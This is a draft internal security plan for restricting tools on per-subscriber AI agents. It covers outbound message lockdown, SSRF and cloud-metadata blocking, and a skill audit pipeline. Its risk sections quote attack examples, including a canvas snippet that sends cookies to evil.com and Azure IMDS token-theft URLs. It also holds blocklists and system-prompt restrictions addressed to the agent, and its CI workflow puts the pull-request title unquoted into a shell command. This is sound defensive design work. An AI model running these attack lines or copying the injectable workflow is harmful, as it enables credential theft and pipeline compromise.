# Agent Tool Security Plan — NBHD United Subscriber Agents

> **Status:** Draft  
> **Date:** 2026-02-14  
> **Audience:** Platform engineering  
> **Context:** Each subscriber ($10/mo) gets an OpenClaw agent on Azure Container Apps. This doc covers tool-level restrictions beyond the existing `tool_policy.py` (which blocks gateway/cron/sessions).

---

## Summary Table

| # | Restriction | Risk Level | Priority | Complexity | Fix Layer |
|---|-------------|-----------|----------|------------|-----------|
| 1 | Message target lockdown | **Critical** | **Critical** | Low | Config + code |
| 2 | web_fetch SSRF prevention | **Critical** | **Critical** | Low | Config + infra |
| 3 | Canvas eval restriction | High | High | Low | Config (deny list) |
| 4 | Nodes tool block | Medium | High | Low | Config (deny list) |
| 5 | web_fetch cloud metadata denylist | **Critical** | **Critical** | Low | Infra (NSG) + config |
| 6 | Skill/plugin audit pipeline | Medium | Medium | Medium | Process + code |

---

## 1. Message Target Lockdown

### Risk

A subscriber's agent could use the `message` tool to send messages to **any** Telegram chat_id — other subscribers, arbitrary users, or groups. This enables:

- **Spam/phishing:** Agent sends messages impersonating the platform to other Telegram users.
- **Cross-tenant harassment:** Subscriber A's agent messages subscriber B.
- **Platform abuse:** Agent used to mass-message, getting our bot banned by Telegram.

### How OpenClaw Works

From source analysis, OpenClaw sets `messageTo` from the originating session context (`sessionCtx.OriginatingTo`). The Telegram channel config already has `dmPolicy: "allowlist"` and `allowFrom: [chat_id]`, which restricts **inbound** messages. But the `message` tool's `target` parameter could override the outbound destination.

The channel config's `allowFrom` only gates who can *initiate* conversations, not where the agent can *send*.

### Fix

**Layer 1 — Channel config (already partially done):**

The existing config locks inbound via `allowFrom`. For outbound, we need to ensure the agent can only reply to the originating chat.

```python
# In config_generator.py — channels section already has:
"channels": {
    "telegram": {
        "dmPolicy": "allowlist",
        "allowFrom": [chat_id],
        "groupPolicy": "deny",  # No group access
    },
},
```

**Layer 2 — Tool policy middleware (new):**

Add a `message` tool interceptor in the orchestrator that validates `target` before the call reaches OpenClaw. This is defense-in-depth since we don't fully control OpenClaw's internal routing.

```python
# apps/orchestrator/tool_interceptors.py

class MessageToolInterceptor:
    """Ensures message tool can only target the subscriber's own chat."""
    
    def __init__(self, allowed_chat_id: str):
        self.allowed_chat_id = allowed_chat_id
    
    def validate(self, tool_call: dict) -> dict:
        """Validate and sanitize message tool parameters."""
        params = tool_call.get("parameters", {})
        target = params.get("target")
        channel = params.get("channel")
        
        # If no target specified, OpenClaw uses the originating session
        # context (messageTo), which is correct. Allow it.
        if target is None:
            return tool_call
        
        # If target is specified, it MUST match the subscriber's chat_id
        if str(target) != self.allowed_chat_id:
            raise ToolPolicyViolation(
                f"message target '{target}' blocked: "
                f"agent may only message chat_id {self.allowed_chat_id}"
            )
        
        # Block cross-channel attempts (e.g., trying to use discord/whatsapp)
        if channel and channel != "telegram":
            raise ToolPolicyViolation(
                f"message channel '{channel}' blocked: "
                f"agent is restricted to telegram"
            )
        
        return tool_call
```

**Layer 3 — System prompt reinforcement:**

```python
# Add to the subscriber agent's system prompt:
SUBSCRIBER_PROMPT_ADDENDUM = """
RESTRICTIONS:
- You may ONLY send messages to the current conversation. 
- Never attempt to message other users, groups, or channels.
- The `message` tool's `target` parameter must not be changed.
"""
```

### Implementation

1. Add `MessageToolInterceptor` to `apps/orchestrator/tool_interceptors.py` — **Low complexity**
2. Wire it into the agent request pipeline (pre-tool-execution hook) — **Low complexity**  
3. Add system prompt addendum in `config_generator.py` — **Low complexity**
4. Unit test: attempt to call `message` with wrong target → blocked

---

## 2. web_fetch SSRF Prevention

### Risk

A subscriber's agent can use `web_fetch` to access internal network resources:

- **Azure IMDS:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` → leaks subscription ID, resource group, managed identity tokens, VM metadata.
- **Managed Identity token theft:** `http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net` → gets Key Vault tokens, potentially accessing ALL tenants' secrets.
- **Internal container apps:** `http://<other-container-app>.<internal-fqdn>/` → access to orchestrator, admin APIs, or other tenant containers.
- **VNET resources:** Database, Redis, storage accounts via private endpoints.

**This is the highest-risk item. A single SSRF to the IMDS can compromise the entire platform.**

### How OpenClaw Works

OpenClaw has **built-in SSRF protection** via `SsrFPolicy` in `infra/net/ssrf.ts`:

```typescript
type SsrFPolicy = {
    allowPrivateNetwork?: boolean;      // default: false (blocks RFC1918 + link-local)
    allowedHostnames?: string[];        // explicit exceptions
    hostnameAllowlist?: string[];       // if set, ONLY these hostnames allowed
};
```

The built-in protection:
- Blocks `localhost`, `metadata.google.internal` by hostname
- Blocks all private/internal IPs after DNS resolution (catches DNS rebinding)
- `isPrivateIpAddress()` covers: `127.x`, `10.x`, `172.16-31.x`, `192.168.x`, `169.254.x`, `fe80:`, `fc/fd`, `::1`

**The `169.254.169.254` (Azure IMDS) is already covered by the private IP check**, as long as `allowPrivateNetwork` is `false` (the default).

### Fix

**Layer 1 — Verify OpenClaw SSRF policy is active (config):**

Ensure the config does NOT set `allowPrivateNetwork: true`. Currently `config_generator.py` doesn't set any SSRF policy, meaning the **default (blocking) behavior is active**. Explicitly set it for defense-in-depth:

```python
# In config_generator.py, add to the tools section:
"tools": {
    "web": {
        "search": {"enabled": True},
        "fetch": {
            "enabled": True,
            # SSRF protection: block private/internal IPs
            # This is the default, but we set it explicitly
            # so it can't be accidentally overridden.
            "ssrf": {
                "allowPrivateNetwork": False,
                # No allowedHostnames — no exceptions
            },
        },
    },
    ...
}
```

**Layer 2 — Azure network policy (NSG / Container App firewall):**

Even if the application-layer SSRF check is bypassed (e.g., via a bug, redirect, or DNS rebinding after validation), the network layer should block it:

```bash
# Azure Container Apps environment-level NSG rule:
# Block outbound to IMDS from all container apps
az network nsg rule create \
  --resource-group nbhd-united-rg \
  --nsg-name aca-subnet-nsg \
  --name block-imds \
  --priority 100 \
  --direction Outbound \
  --access Deny \
  --protocol Tcp \
  --destination-address-prefixes 169.254.169.254 \
  --destination-port-ranges '*'

# Block outbound to VNET-internal ranges from subscriber containers
# (orchestrator needs internal access; subscriber containers don't)
az network nsg rule create \
  --resource-group nbhd-united-rg \
  --nsg-name subscriber-subnet-nsg \
  --name block-internal \
  --priority 110 \
  --direction Outbound \
  --access Deny \
  --protocol '*' \
  --destination-address-prefixes 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16
```

**Layer 3 — Container Apps ingress restriction:**

If using Container Apps internal networking, ensure subscriber containers have **no internal ingress** from other subscriber containers:

```bicep
// In Container App environment config:
resource subscriberApp 'Microsoft.App/containerApps@2023-05-01' = {
  properties: {
    configuration: {
      ingress: {
        external: false
        // Only the orchestrator can reach this container
        ipSecurityRestrictions: [
          {
            name: 'allow-orchestrator-only'
            ipAddressRange: '<orchestrator-subnet-cidr>'
            action: 'Allow'
          }
          {
            name: 'deny-all'
            ipAddressRange: '0.0.0.0/0'
            action: 'Deny'
          }
        ]
      }
    }
  }
}
```

### Implementation

1. Add explicit SSRF config to `config_generator.py` — **Low complexity**
2. NSG rules on Azure — **Low complexity** (but test thoroughly)
3. Container Apps ingress restrictions — **Medium complexity** (requires infra changes)

---

## 3. Canvas Eval Restriction

### Risk

The `canvas` tool's `eval` action executes arbitrary JavaScript in a browser context. A subscriber agent could:

- **Exfiltrate data:** `fetch('https://evil.com/?data=' + document.cookie)`
- **Crypto mining:** Run compute-intensive JS in the canvas
- **Pivot:** If the canvas browser has access to internal URLs, use it as an SSRF proxy
- **Resource abuse:** Infinite loops, memory bombs

### How OpenClaw Works

The canvas runs in a browser context (headless Chromium or similar). The `eval` action sends JavaScript to execute in that context. OpenClaw's default sandbox tool policy already **denies canvas** for sandbox agents:

```javascript
const DEFAULT_TOOL_DENY = ["browser", "canvas", "nodes", "cron", "gateway", ...CHANNEL_IDS];
```

### Fix

**Block `canvas` entirely for subscriber agents.** The subscriber use case (personal AI assistant for meal planning/chef interaction) does not need canvas.

```python
# In tool_policy.py, add to BLOCKED_TOOLS:
BLOCKED_TOOLS = frozenset({
    "gateway",
    "cron",
    "sessions_spawn",
    "sessions_send",
    "sessions_list",
    "sessions_history",
    "session_status",
    "agents_list",
    # --- NEW ---
    "canvas",           # eval action runs arbitrary JS — no subscriber need
    "nodes",            # device pairing/control — no subscriber need (see #4)
})
```

And in the OpenClaw config via the sandbox tool policy:

```python
# In config_generator.py, add sandbox tool policy:
"tools": {
    "sandbox": {
        "tools": {
            "deny": ["canvas", "nodes", "cron", "gateway"],
        },
    },
    ...
}
```

### Future: Safe Canvas

If we ever want to enable canvas for subscribers (e.g., interactive dashboards):
- Run canvas in a **separate, network-isolated sandbox container**
- Use Content-Security-Policy to block `fetch`, `XMLHttpRequest`, `WebSocket`
- Time-limit eval to 5 seconds
- Memory-limit the browser context

**For now: block entirely.**

### Implementation

1. Add `canvas` and `nodes` to `BLOCKED_TOOLS` — **Low complexity**
2. Add sandbox tool deny list to config — **Low complexity**

---

## 4. Nodes Tool — Block Entirely

### Risk

The `nodes` tool enables:
- **Device pairing:** Agent could attempt to pair with physical devices
- **Camera access:** `camera_snap`, `camera_clip` — access device cameras
- **Screen recording:** `screen_record` — capture device screens
- **Remote execution:** `run` — execute commands on paired devices
- **Location tracking:** `location_get` — get device GPS coordinates

Even if no devices are paired, the tool could:
- Attempt to approve pending pairing requests
- Scan for devices on the network
- Be used as a social engineering vector ("pair your phone to get feature X")

### Fix

**Block entirely.** Already covered in #3 above (added to `BLOCKED_TOOLS`).

```python
# Already in the updated BLOCKED_TOOLS:
"nodes",  # device pairing/control — block entirely
```

### When to Re-enable

Safe to enable `nodes` only when ALL of:
1. Per-tenant device pairing registry (tenant A can only see their own devices)
2. Device pairing requires out-of-band confirmation (physical button press + platform approval)
3. Sensitive actions (camera, screen, location, run) require explicit per-action user consent via Telegram confirmation button
4. All device interactions are audit-logged
5. Rate limiting on device commands (prevent abuse of paired devices)

**Estimated timeline:** Not before v2. Low subscriber demand.

### Implementation

1. Already covered by `BLOCKED_TOOLS` addition — **Low complexity**

---

## 5. web_fetch Cloud Metadata & Internal URL Denylist

### Risk

Specific endpoints beyond generic private IPs:

| Endpoint | Risk | 
|----------|------|
| `169.254.169.254` | Azure IMDS — tokens, subscription info, managed identity |
| `168.63.129.16` | Azure wireserver — DHCP, DNS, health probes, extensions |
| `169.254.169.253` | Azure DNS (on some configs) |
| `metadata.google.internal` | GCP metadata (if ever multi-cloud) |
| `100.100.100.200` | Alibaba Cloud metadata |
| `fd00:ec2::254` | AWS IMDS v6 |
| `*.internal`, `*.local` | mDNS / internal service discovery |
| `*.svc.cluster.local` | Kubernetes service DNS |
| `<container-app-name>.<env>.internal` | Azure Container Apps internal FQDN |

### Fix

**OpenClaw's built-in SSRF guard already blocks all of these** via `isPrivateIpAddress()`:
- `169.254.x.x` → link-local → blocked
- `168.63.129.16` → NOT in private ranges! This is a special Azure IP that's publicly routable but only accessible from within Azure VMs.
- `100.100.100.200` → NOT in standard private ranges (it's in 100.64.0.0/10 CGNAT range)

**Gap identified:** OpenClaw's `isPrivateIpAddress` likely doesn't cover:
- `168.63.129.16` (Azure wireserver)  
- `100.64.0.0/10` (CGNAT / shared address space, used by cloud providers)

**Layer 1 — Network-level block (critical for 168.63.129.16):**

```bash
# Block Azure wireserver from subscriber containers
az network nsg rule create \
  --resource-group nbhd-united-rg \
  --nsg-name subscriber-subnet-nsg \
  --name block-wireserver \
  --priority 105 \
  --direction Outbound \
  --access Deny \
  --protocol '*' \
  --destination-address-prefixes 168.63.129.16/32

# Block CGNAT range (used by some cloud metadata services)
az network nsg rule create \
  --resource-group nbhd-united-rg \
  --nsg-name subscriber-subnet-nsg \
  --name block-cgnat \
  --priority 106 \
  --direction Outbound \
  --access Deny \
  --protocol '*' \
  --destination-address-prefixes 100.64.0.0/10
```

**Layer 2 — Application-level URL validator (defense-in-depth):**

```python
# apps/orchestrator/url_validator.py
import ipaddress
import re
from urllib.parse import urlparse

# IPs/ranges to block beyond OpenClaw's built-in private IP check
EXTRA_BLOCKED_RANGES = [
    ipaddress.ip_network("168.63.129.16/32"),   # Azure wireserver
    ipaddress.ip_network("100.64.0.0/10"),       # CGNAT (cloud metadata)
    ipaddress.ip_network("169.254.0.0/16"),      # Link-local (redundant but explicit)
    ipaddress.ip_network("fd00::/8"),             # ULA IPv6
]

BLOCKED_HOSTNAME_PATTERNS = [
    r"\.internal$",
    r"\.local$",
    r"\.svc\.cluster\.local$",
    r"^metadata\.",
    r"\.azurecontainer\.io$",        # Other container instances
    r"\.internal\.\w+\.azurecontainerapps\.dev$",  # ACA internal FQDN
]

def is_url_allowed(url: str) -> tuple[bool, str]:
    """Check if a URL is safe for subscriber agent to fetch.
    
    Returns (allowed, reason_if_blocked).
    """
    try:
        parsed = urlparse(url)
    except Exception:
        return False, "invalid URL"
    
    hostname = parsed.hostname
    if not hostname:
        return False, "no hostname"
    
    # Check blocked hostname patterns
    for pattern in BLOCKED_HOSTNAME_PATTERNS:
        if re.search(pattern, hostname, re.IGNORECASE):
            return False, f"blocked hostname pattern: {pattern}"
    
    # Check if hostname is a raw IP
    try:
        addr = ipaddress.ip_address(hostname)
        for network in EXTRA_BLOCKED_RANGES:
            if addr in network:
                return False, f"blocked IP range: {network}"
    except ValueError:
        pass  # Not an IP, that's fine
    
    # Block non-HTTP(S) schemes
    if parsed.scheme not in ("http", "https"):
        return False, f"blocked scheme: {parsed.scheme}"
    
    return True, ""
```

### Implementation

1. NSG rules for wireserver + CGNAT — **Low complexity, critical priority**
2. Application-level URL validator — **Low complexity**
3. Wire URL validator into web_fetch tool interceptor — **Low complexity**

---

## 6. Skill/Plugin Audit Pipeline

### Risk

Platform-wide skills (installed once, available to all tenant agents) create a supply-chain attack surface:

- **Malicious skill update:** A previously-safe skill gets updated with data exfiltration code. All 1000 subscribers are now compromised.
- **Cross-tenant data leakage:** A skill that caches data could leak Tenant A's data to Tenant B if the cache isn't tenant-scoped.
- **Privilege escalation:** A skill that calls `exec` internally could bypass the subscriber's tool restrictions.
- **Prompt injection via skill output:** A skill returns crafted text that makes the agent perform unauthorized actions.

### Current State

We have `skill-scanner` and `skill-sandbox` (see TOOLS.md). These are designed for MJ's personal agent, not for a multi-tenant platform.

### Fix

**Layer 1 — Skill allow-list (no dynamic installation):**

Subscribers cannot install skills. Only platform-approved skills are available:

```python
# In config_generator.py, plugins section:
"plugins": {
    "allow": [APPROVED_PLUGIN_ID],      # Explicit allowlist
    "denyInstall": True,                 # Prevent runtime skill installation
    "entries": {
        APPROVED_PLUGIN_ID: {"enabled": True},
    },
}
```

**Layer 2 — CI/CD skill audit pipeline:**

```yaml
# .github/workflows/skill-audit.yml
name: Skill Security Audit
on:
  pull_request:
    paths:
      - 'skills/**'
      - 'plugins/**'

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run skill scanner
        run: |
          cd skill-scanner
          uv run skill-scanner scan ../skills/${{ github.event.pull_request.title }} \
            --use-behavioral --use-llm \
            --format markdown --output /tmp/report.md
      
      - name: Fail on findings
        run: |
          if grep -q "FINDING" /tmp/report.md; then
            echo "::error::Security findings detected in skill"
            cat /tmp/report.md
            exit 1
          fi
      
      - name: Post report to PR
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const report = fs.readFileSync('/tmp/report.md', 'utf8');
            github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `## 🔒 Skill Security Report\n\n${report}`
            });
```

**Layer 3 — Runtime skill isolation:**

```python
# Skills should never have direct access to:
SKILL_BLOCKED_CAPABILITIES = [
    "filesystem_outside_workspace",  # No access beyond /home/node/.openclaw/workspace
    "network_internal",              # No access to internal network
    "secret_access",                 # No direct Key Vault access
    "cross_tenant_data",             # No shared state between tenants
    "tool_policy_override",          # Cannot modify its own restrictions
]
```

**Layer 4 — Tenant-scoped skill state:**

Any skill that maintains state (caches, databases, files) must namespace by tenant:

```python
# Enforced in skill review checklist:
# 1. All file paths include tenant_id
# 2. All cache keys include tenant_id  
# 3. No shared in-memory state between requests
# 4. No global singletons that accumulate cross-tenant data
```

**Layer 5 — Skill update review process:**

```
1. Dependabot/Renovate creates PR for skill update
2. CI runs skill-scanner (automated)
3. Diff review: what changed since last approved version
4. Manual approval required (no auto-merge for skill updates)
5. Staged rollout: deploy to 5% of agents, monitor for 24h
6. Full rollout
```

### Implementation

1. Lock skill installation in config — **Low complexity**
2. CI pipeline for skill audits — **Medium complexity**
3. Skill review checklist / process documentation — **Low complexity**
4. Staged rollout infrastructure — **High complexity** (needs canary deployment)

---

## Implementation Roadmap

### Phase 1 — Critical (before launch)

| Task | File | Change |
|------|------|--------|
| Add `canvas`, `nodes` to `BLOCKED_TOOLS` | `tool_policy.py` | 2 lines |
| Add sandbox tool deny list to config | `config_generator.py` | ~10 lines |
| Add explicit SSRF config (`allowPrivateNetwork: false`) | `config_generator.py` | ~5 lines |
| Create NSG rules for IMDS + wireserver + CGNAT | Azure CLI / Bicep | Infra |
| Create `MessageToolInterceptor` | New file: `tool_interceptors.py` | ~40 lines |
| Wire interceptor into agent pipeline | `config_generator.py` or orchestrator | ~10 lines |
| Add system prompt restrictions | `config_generator.py` | ~5 lines |

### Phase 2 — High priority (first week)

| Task | File | Change |
|------|------|--------|
| Create `url_validator.py` | New file | ~60 lines |
| Wire URL validator into web_fetch interceptor | `tool_interceptors.py` | ~20 lines |
| Container Apps ingress restrictions | Bicep / Azure CLI | Infra |
| Lock skill installation in config | `config_generator.py` | ~5 lines |

### Phase 3 — Medium priority (first month)

| Task | File | Change |
|------|------|--------|
| CI skill audit pipeline | `.github/workflows/` | New workflow |
| Skill review checklist | `docs/` | Documentation |
| Audit logging for tool policy violations | `tool_interceptors.py` | ~20 lines |

---

## Updated tool_policy.py (Reference)

```python
BLOCKED_TOOLS = frozenset({
    # Runtime management
    "gateway",
    "cron",
    # Session isolation
    "sessions_spawn",
    "sessions_send",
    "sessions_list",
    "sessions_history",
    "session_status",
    "agents_list",
    # Dangerous capabilities
    "canvas",           # Arbitrary JS eval
    "nodes",            # Device pairing/control
})
```

## Updated config_generator.py Additions (Reference)

```python
def generate_openclaw_config(tenant: Tenant) -> dict[str, Any]:
    chat_id = str(tenant.user.telegram_chat_id)
    # ... existing code ...
    
    config = {
        # ... existing sections ...
        
        "tools": {
            "web": {
                "search": {"enabled": True},
                "fetch": {
                    "enabled": True,
                    "ssrf": {
                        "allowPrivateNetwork": False,
                    },
                },
            },
            "sandbox": {
                "tools": {
                    "deny": [
                        "canvas", "nodes", "cron", "gateway",
                        "sessions_spawn", "sessions_send",
                        "sessions_list", "sessions_history",
                        "session_status", "agents_list",
                    ],
                },
            },
            "gateway": {"enabled": False},
            "exec": {"enabled": False},  # Unless plus tier
        },
    }
    
    return config
```

---

## Testing Checklist

- [ ] `message` tool with wrong target → ToolPolicyViolation
- [ ] `message` tool with no target (default) → allowed
- [ ] `web_fetch http://169.254.169.254/...` → blocked (app layer)
- [ ] `web_fetch http://168.63.129.16/...` → blocked (NSG + app layer)
- [ ] `web_fetch http://10.0.0.1/...` → blocked (OpenClaw SSRF + NSG)
- [ ] `web_fetch https://google.com` → allowed
- [ ] `canvas` tool call → blocked by tool policy
- [ ] `nodes` tool call → blocked by tool policy
- [ ] Skill installation attempt → blocked
- [ ] Agent calling `gateway` → blocked
- [ ] Agent calling `cron` → blocked
